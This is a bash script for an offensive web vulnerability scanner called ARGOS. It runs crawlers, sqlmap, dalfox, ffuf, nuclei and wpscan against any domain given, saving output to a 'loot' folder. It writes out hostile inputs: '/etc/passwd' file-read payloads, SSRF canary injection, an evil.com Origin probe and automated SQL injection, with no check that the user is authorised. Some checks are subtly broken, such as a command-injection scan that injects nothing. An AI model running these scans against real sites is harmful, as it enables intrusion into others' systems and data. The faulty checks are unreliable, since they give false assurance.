#!/usr/bin/env bash
###############################################################################
# ARGOS - Enhanced Vulnerabilities Scanner
###############################################################################

source "$(dirname "$0")/../lib/argos_lib.sh"

RED="\033[0;31m"
GREEN="\033[0;32m"
CYAN="\033[0;36m"
YELLOW="\033[0;33m"
MAGENTA="\033[0;35m"
RESET="\033[0m"

cat << "EOF"
  ███╗   ███╗     ███╗     ███╗    ████╗ 
 █████╗ ██████╗  ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗██╔════╝
███████║██████╔╝██║  ███╗██║   ██║███████╗
██╔══██║██╔══██╗██║   ██║██║   ██║╚════██║
██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
      V U L N E R A B I L I T I E S
EOF

# Initialize variables
TARGET="$1"
declare -A SCAN_OPTIONS
LOOT_DIR=""
BLINDXSS=""

# Dependency list
declare -A DEPENDENCIES=(
  ["subjack"]="subjack"
  ["dalfox"]="dalfox"
  ["gau"]="gau"
  ["gf"]="gf"
  ["sqlmap"]="sqlmap"
  ["nuclei"]="nuclei"
  ["ffuf"]="ffuf"
  ["wpscan"]="wpscan"
  ["testssl.sh"]="testssl.sh"
  ["gospider"]="gospider"
  ["commix"]="commix"
  ["jq"]="jq"
)

# ----------------------------
# Vulnerability Functions
# ----------------------------

run_subdomain_takeover() {
  echo -e "${CYAN}[*] Checking Subdomain Takeovers...${RESET}"
  run_command "subjack -d $TARGET -ssl -v -o $LOOT_DIR/subdomain_takeover.txt"
}

run_xss_scan() {
  echo -e "${CYAN}[*] Running XSS Scan...${RESET}"
  run_command "gospider -s https://$TARGET -d 2 | grep -Eo 'http[s]?://[^ ]+' | gau | gf xss | dalfox pipe -o $LOOT_DIR/xss_results.txt"
}

run_sqli_scan() {
  echo -e "${CYAN}[*] Running SQL Injection Scan...${RESET}"
  run_command "gospider -s https://$TARGET -d 2 | grep -Eo 'http[s]?://[^ ]+' | gau | gf sqli | sqlmap --batch --random-agent --level=3 -m - -o $LOOT_DIR/sqli_results.txt"
}

run_ssrf_scan() {
  echo -e "${CYAN}[*] Checking SSRF Vulnerabilities...${RESET}"
  run_command "gospider -s https://$TARGET -d 2 | grep -Eo 'http[s]?://[^ ]+' | gau | gf ssrf | qsreplace 'http://canarytokens.com/tags/ssrf' | xargs -P 20 -I % sh -c 'curl -s % | grep \"canarytokens\" && echo \"VULN! %\"' | tee $LOOT_DIR/ssrf_results.txt"
}

run_lfi_scan() {
  echo -e "${CYAN}[*] Checking LFI/RFI Vulnerabilities...${RESET}"
  run_command "gospider -s https://$TARGET -d 2 | grep -Eo 'http[s]?://[^ ]+' | gau | gf lfi | qsreplace '/etc/passwd' | xargs -P 20 -I % sh -c 'curl -s % | grep \"root:\" && echo \"VULN! %\"' | tee $LOOT_DIR/lfi_results.txt"
}

run_cors_scan() {
  echo -e "${CYAN}[*] Checking CORS Misconfigurations...${RESET}"
  run_command "gospider -s https://$TARGET -d 2 | grep -Eo 'http[s]?://[^ ]+' | while read URL; do curl -vs -H 'Origin: https://evil.com' --max-time 5 \"\$URL\" 2>&1 | grep -E 'Access-Control-Allow-Origin: https://evil.com' && echo \"VULN! \$URL\"; done | tee $LOOT_DIR/cors_vulns.txt"
}

run_ssl_scan() {
  echo -e "${CYAN}[*] Performing SSL/TLS Scan...${RESET}"
  run_command "testssl.sh --htmlfile $LOOT_DIR/ssl_audit.html $TARGET"
}

run_directory_fuzzing() {
  echo -e "${CYAN}[*] Performing Directory Fuzzing...${RESET}"
  run_command "ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://$TARGET/FUZZ -recursion -t 50 -o $LOOT_DIR/ffuf_results.html -of html"
}

run_cms_scan() {
  echo -e "${CYAN}[*] Detecting CMS...${RESET}"
  run_command "wpscan --url https://$TARGET --no-update -e vp,vt,tt,cb,dbe --output $LOOT_DIR/wpscan_results.txt"
}

run_command_injection_scan() {
  echo -e "${CYAN}[*] Checking Command Injection Vulnerabilities...${RESET}"
  run_command "gospider -s https://$TARGET -d 2 | grep -Eo 'http[s]?://[^ ]+' | gau | gf rce | xargs -I % -P 20 sh -c 'curl -s \"%\" | grep -qi \"(root)\" && echo \"VULN! %\"' | tee $LOOT_DIR/command_injection.txt"
}

run_nuclei_scan() {
  echo -e "${CYAN}[*] Running Nuclei Deep Scan...${RESET}"
  run_command "nuclei -u https://$TARGET -severity critical,high -as -si 100 -o $LOOT_DIR/nuclei_results.txt"
}

# ----------------------------
# Main Execution
# ----------------------------

# Get target input
if [ -z "$TARGET" ]; then
  echo -ne "${CYAN}Enter target domain (e.g. example.com): ${RESET}"
  read -r TARGET
  validate_domain "$TARGET"
fi
[ -z "$TARGET" ] && { echo -e "${RED}[!] No domain provided.${RESET}"; exit 1; }

# Configure loot directory
TS=$(date +%Y%m%d_%H%M%S)
LOOT_DIR="./loot/vulns_${TARGET//\//_}_${TS}"
mkdir -p "$LOOT_DIR"

# Dependency check
for tool in "${!DEPENDENCIES[@]}"; do
  if ! command -v "${DEPENDENCIES[$tool]}" >/dev/null; then
    echo -e "${RED}[!] Missing dependency: ${tool}${RESET}"
    exit 1
  fi
done

# Interactive scan selection
echo -e "${YELLOW}"
PS3='Select vulnerabilities to scan: '
options=(
  "Full Scan" 
  "Subdomain Takeover" 
  "XSS Scan" 
  "SQL Injection" 
  "SSRF Check" 
  "LFI/RFI Check" 
  "CORS Misconfig" 
  "SSL Audit" 
  "Directory Fuzzing" 
  "CMS Detection" 
  "Command Injection" 
  "Nuclei Deep Scan"
)
select opt in "${options[@]}"; do
  case $REPLY in
    1) SCAN_OPTIONS=([1]=1 [2]=1 [3]=1 [4]=1 [5]=1 [6]=1 [7]=1 [8]=1 [9]=1 [10]=1 [11]=1 [12]=1); break ;;
    2) SCAN_OPTIONS[2]=1 ;;
    3) SCAN_OPTIONS[3]=1 ;;
    4) SCAN_OPTIONS[4]=1 ;;
    5) SCAN_OPTIONS[5]=1 ;;
    6) SCAN_OPTIONS[6]=1 ;;
    7) SCAN_OPTIONS[7]=1 ;;
    8) SCAN_OPTIONS[8]=1 ;;
    9) SCAN_OPTIONS[9]=1 ;;
    10) SCAN_OPTIONS[10]=1 ;;
    11) SCAN_OPTIONS[11]=1 ;;
    12) SCAN_OPTIONS[12]=1 ;;
    *) echo "Invalid option"; continue ;;
  esac
done
echo -e "${RESET}"

# Execute selected scans
[[ -n "${SCAN_OPTIONS[1]}" ]] && {
  run_subdomain_takeover
  run_xss_scan
  run_sqli_scan
  run_ssrf_scan
  run_lfi_scan
  run_cors_scan
  run_ssl_scan
  run_directory_fuzzing
  run_cms_scan
  run_command_injection_scan
  run_nuclei_scan
}

[[ -n "${SCAN_OPTIONS[2]}" ]] && run_subdomain_takeover
[[ -n "${SCAN_OPTIONS[3]}" ]] && run_xss_scan
[[ -n "${SCAN_OPTIONS[4]}" ]] && run_sqli_scan
[[ -n "${SCAN_OPTIONS[5]}" ]] && run_ssrf_scan
[[ -n "${SCAN_OPTIONS[6]}" ]] && run_lfi_scan
[[ -n "${SCAN_OPTIONS[7]}" ]] && run_cors_scan
[[ -n "${SCAN_OPTIONS[8]}" ]] && run_ssl_scan
[[ -n "${SCAN_OPTIONS[9]}" ]] && run_directory_fuzzing
[[ -n "${SCAN_OPTIONS[10]}" ]] && run_cms_scan
[[ -n "${SCAN_OPTIONS[11]}" ]] && run_command_injection_scan
[[ -n "${SCAN_OPTIONS[12]}" ]] && run_nuclei_scan

echo -e "${GREEN}[+] Vulnerability scan completed! Results saved to: $LOOT_DIR${RESET}"